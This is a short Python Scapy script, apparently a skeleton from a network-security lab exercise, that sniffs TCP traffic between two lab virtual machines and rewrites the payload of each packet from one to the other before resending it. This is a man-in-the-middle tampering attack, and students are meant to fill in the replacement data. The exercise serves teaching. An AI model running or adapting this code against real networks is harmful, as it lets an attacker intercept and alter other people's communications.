#!/usr/bin/python3
from scapy.all import *
import re
VM_A_IP = '10.0.2.13'
VM_B_IP = '10.0.2.14'
VM_A_MAC = '08:00:27:59:a3:c9'
VM_B_MAC = '08:00:27:70:0c:00'
def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
        # Create a new packet based on the captured one.
        # (1) We need to delete the checksum fields in the IP and TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them for us if these fields are missing.
        # (2) We also delete the original TCP payload.
        newpkt = IP(pkt[IP])
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        del(newpkt[TCP].payload)
        #####################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        olddata = pkt[TCP].payload.load # Get the original payload data
        newdata = 'Z' # No change is made in this sample code
        #####################################################################
        # Attach the new data and set the packet out
        send(newpkt/newdata)
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        send(pkt[IP]) # Forward the original packet
pkt = sniff(filter='tcp',prn=spoof_pkt)